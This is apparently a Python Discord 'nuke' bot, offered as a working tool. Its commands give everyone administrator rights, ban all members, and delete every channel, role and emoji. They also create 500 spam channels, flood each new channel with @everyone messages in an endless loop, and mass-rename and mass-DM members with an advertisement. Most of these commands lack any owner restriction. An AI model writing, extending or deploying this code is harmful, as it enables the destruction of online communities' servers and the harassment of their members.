import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore

token = ""  # Token Here

SPAM_CHANNEL = ["The Rock", "Script Kiddie", "Adopted", "Boom", "Hello World!"]
SPAM_MESSAGE = ["@everyone Oni On Top"]

intents = discord.Intents.default()
intents.members = True

client = commands.Bot(command_prefix='.', intents=intents)


@client.event
async def on_ready():
    print('Oni On Top')
    await client.change_presence(activity=discord.Game(name=".Nuke"))


@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print(Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)


@client.command()
async def Nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        await ctx.send("I have given everyone admin.")
        await guild.default_role.edit(permissions=Permissions.all())
    except Exception as e:
        print(Fore.GREEN + f"I was unable to give everyone admin: {e}" + Fore.RESET)

    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
        except Exception as e:
            print(Fore.GREEN + f"{channel.name} was NOT deleted: {e}" + Fore.RESET)

    for member in guild.members:
        try:
            await member.ban()
            print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
        except Exception as e:
            print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned: {e}" + Fore.RESET)

    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
        except Exception as e:
            print(Fore.GREEN + f"{role.name} Has not been deleted: {e}" + Fore.RESET)

    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
        except Exception as e:
            print(Fore.GREEN + f"{emoji.name} Wasn't Deleted: {e}" + Fore.RESET)

    banned_users = await guild.bans()
    for ban_entry in banned_users:
        user = ban_entry.user
        try:
            await user.unban("Obama's Step Son#1557")
            print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
        except Exception as e:
            print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned: {e}" + Fore.RESET)

    await guild.create_text_channel("Onion")
    for _ in range(500):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"Nuked {guild.name} Successfully.")


@client.command()
async def ObamaRename(ctx, rename_to):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await member.edit(nick=rename_to)
            print(f"{member.name} has been renamed to {rename_to}")
        except Exception as e:
            print(f"{member.name} has NOT been renamed: {e}")
    print("Action completed: Rename all")


@client.command()
async def ObamaMessage(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            embed = discord.Embed(title="Sub To Astrotrek", description="Obama's Step Son ON TOP", color=discord.Colour.purple())
            embed.set_thumbnail(url="https://tenor.com/view/destory-eexplode-nuke-gif-6073338")
            embed.set_footer(text="Sub To Astrotrek")
            await member.send(embed=embed)
        except Exception as e:
            pass
    print("Action completed: Message all")


@client.command()
async def ObamaEmoji(ctx):
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
            print(f"{emoji.name} has been deleted")
        except Exception as e:
            pass


@client.command()
async def ObamaRole(ctx):
    for role in ctx.guild.roles:
        try:
            await role.delete()
            print(f"{role.name} has been deleted")
        except Exception as e:
            pass


@client.command()
@commands.is_owner()
async def ObamaHelp(ctx):
    await ctx.message.delete()
    try:
        embed = discord.Embed(title="Made By Obama's Step Son#1557",
                              description="Commands: \n \n .ObamaEmoji (deletes all emojis) \n **.Obama (main command)** \n .ObamaMessage (messages everyone in the server)  \n .ObamaRole (deletes all roles) \n .ObamaRename (renames everyone to whatever you specify) ",
                              color=discord.Colour.purple())
        embed.set_footer(text="Sub To Astrotrek")
        await ctx.author.send(embed=embed)
    except Exception as e:
        pass


@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))


client.run(token, bot=True)
